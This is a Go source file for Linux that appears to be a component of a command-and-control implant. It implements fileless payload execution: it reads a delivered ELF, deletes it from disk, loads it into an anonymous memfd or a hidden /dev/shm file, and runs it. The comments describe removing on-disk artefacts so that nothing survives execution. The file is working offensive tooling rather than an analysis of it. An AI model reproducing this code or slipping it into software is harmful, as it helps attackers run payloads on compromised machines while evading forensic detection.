//go:build linux

package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"
)

// execELFInMemory loads `path` into an anonymous memfd and executes
// it. The file is never mmap'd from disk during execution — the ELF
// bytes live in an in-memory file descriptor whose /proc/self/fd/N
// path is passed to the kernel as the executable.
//
// This eliminates the disk-resident artefact that would otherwise
// remain between writechunk tasks and execmem. Once the memfd is
// created and the bytes are written, the source file is unlinked
// before exec so nothing survives on disk after execution.
//
// Returns the payload's combined stdout+stderr and exit code.
func execELFInMemory(ctx context.Context, path string,
	args []string) (string, int, error) {

	data, err := os.ReadFile(path)
	if err != nil {
		return "", -1, fmt.Errorf("read payload: %w", err)
	}

	// Unlink immediately — the source file has no further purpose
	// and this removes the on-disk artefact before the payload runs.
	_ = os.Remove(path)

	// memfd_create is available via raw syscall on every Linux
	// architecture Go supports. Using the raw syscall avoids a
	// dependency on golang.org/x/sys/unix and keeps the module
	// stdlib-only.
	fd, err := memfdCreate("payload")
	if err != nil {
		// Fall back to /dev/shm if memfd is unavailable (very old
		// kernels or restricted seccomp profiles).
		return execELFViaShm(ctx, data, args)
	}
	defer syscall.Close(fd)

	if _, err := syscall.Write(fd, data); err != nil {
		return "", -1, fmt.Errorf("write memfd: %w", err)
	}

	// Mark the memfd executable. fchmod on the fd itself is the
	// portable way — chmod on /proc/self/fd/N works but is a
	// privilege-checked path.
	if err := syscall.Fchmod(fd, 0700); err != nil {
		return "", -1, fmt.Errorf("fchmod memfd: %w", err)
	}

	// Re-read from the fd for execution. Running via /proc/self/fd/N
	// avoids needing fexecve(2), which is not exposed by Go's
	// syscall package on every architecture.
	procPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	cmd := exec.CommandContext(ctx, procPath, args...)
	cmd.Env = sanitizedEnv()
	// Pass the memfd through so the kernel can still resolve the
	// path after execve replaces the process image.
	cmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fd), procPath)}

	combined, err := cmd.CombinedOutput()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return string(combined), -1, err
		}
	}
	return string(combined), exitCode, nil
}

// execPEInMemory is a stub on Linux. PE execution requires Windows.
// The symbol exists so main.go's execmemVerb dispatcher can call it
// unconditionally; the runtime check happens in the console, not here.
func execPEInMemory(_ context.Context, _ string,
	_ []string) (string, int, error) {
	return "", -1, errors.New("pe in-memory execution requires a Windows target")
}

// memfdCreate is a thin wrapper around the memfd_create(2) syscall.
// The syscall number varies by architecture; this table covers every
// Linux target Go supports.
func memfdCreate(name string) (int, error) {
	var nr uintptr
	switch runtime.GOARCH {
	case "amd64", "386":
		nr = 319
	case "arm64":
		nr = 279
	case "arm":
		nr = 385
	case "riscv64":
		nr = 279
	case "ppc64", "ppc64le":
		nr = 360
	case "s390x":
		nr = 350
	case "mips", "mipsle", "mips64", "mips64le":
		nr = 354
	default:
		return -1, errors.New("memfd_create unsupported on " + runtime.GOARCH)
	}

	nameBytes, err := syscall.BytePtrFromString(name)
	if err != nil {
		return -1, err
	}
	// MFD_CLOEXEC = 0x0001. Without CLOEXEC the fd would leak into
	// any child the payload spawns.
	r, _, errno := syscall.Syscall(
		nr,
		uintptr(unsafe.Pointer(nameBytes)),
		uintptr(0x0001),
		0,
	)
	if errno != 0 {
		return -1, errno
	}
	return int(r), nil
}

// execELFViaShm is the fallback path for kernels where memfd_create
// is unavailable. It writes the payload to /dev/shm, executes it,
// and unlinks it immediately.
//
// Less clean than memfd — the ELF briefly lives on a tmpfs — but
// still leaves nothing behind after the process starts.
func execELFViaShm(ctx context.Context, data []byte,
	args []string) (string, int, error) {

	// os.CreateTemp produces a random name so parallel executions
	// do not collide. The path is unlinked immediately after the
	// child exits.
	f, err := os.CreateTemp("/dev/shm", ".exec")
	if err != nil {
		return "", -1, fmt.Errorf("create temp: %w", err)
	}
	tmp := f.Name()

	if _, err := f.Write(data); err != nil {
		f.Close()
		os.Remove(tmp)
		return "", -1, fmt.Errorf("write temp: %w", err)
	}
	if err := f.Chmod(0700); err != nil {
		f.Close()
		os.Remove(tmp)
		return "", -1, fmt.Errorf("chmod temp: %w", err)
	}
	f.Close()

	cmd := exec.CommandContext(ctx, tmp, args...)
	cmd.Env = sanitizedEnv()

	combined, err := cmd.CombinedOutput()
	// Unlink after execution — CombinedOutput already drained the
	// file, so the fd no longer needs the path.
	_ = os.Remove(tmp)

	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return string(combined), -1, err
		}
	}
	return string(combined), exitCode, nil
}